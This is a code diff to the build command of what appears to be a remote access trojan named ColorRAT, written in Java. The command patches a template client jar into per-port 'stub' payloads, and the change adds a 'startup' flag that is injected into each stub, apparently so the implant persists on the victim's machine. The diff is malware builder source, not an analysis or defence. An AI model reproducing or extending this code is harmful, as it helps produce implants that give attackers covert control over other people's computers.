@@ -23,7 +23,7 @@ public class BuildCommand implements Command {
 
     @Override
     public boolean execute(String[] args) {
-        if(args.length == 1) {
+        if (args.length == 2) {
             int port;
 
             try {
@@ -33,10 +33,12 @@ public class BuildCommand implements Command {
                 return true;
             }
 
+            boolean startup = Boolean.valueOf(args[1]);
+
             final AtomicReference<Listener> listener = new AtomicReference<>();
             ColorServer.getInstance().getListeners().stream().filter(listener1 -> listener1.getPort() == port).findFirst().ifPresent(listener::set);
 
-            if(listener.get() == null) {
+            if (listener.get() == null) {
                 ColorServer.getLogger().error("The given listener-port \"" + args[0] + "\" doesn't exists!");
                 return true;
             }
@@ -44,16 +46,17 @@ public class BuildCommand implements Command {
             final File inputFile = new File("assets/ColorRAT - Client.jar");
             final File outputFile = new File("stubs/stub-" + port + ".jar");
 
-            if(!outputFile.getParentFile().exists())
+            if (!outputFile.getParentFile().exists())
                 outputFile.getParentFile().mkdirs();
 
-            if(!inputFile.exists()) {
+            if (!inputFile.exists()) {
                 ColorServer.getLogger().error("The template stub doesn't exits. Please reinstall everything!");
                 return true;
             }
 
             new Injector(inputFile.getAbsolutePath(), "eu.aragonapp.colorrat.ColorClient", injector -> {
                 injector.insertBefore("setInformations", "this.port = " + port + ";");
+                injector.insertBefore("setInformations", "this.startup = " + startup + ";");
                 injector.insertBefore("setInformations", "this.address = \"127.0.0.1\";");
                 return null;
             }).write(outputFile.getAbsolutePath());
@@ -71,7 +74,7 @@ public class BuildCommand implements Command {
 
     @Override
     public String usage() {
-        return "build <port>";
+        return "build <port> <startup>";
     }
 
     @Override
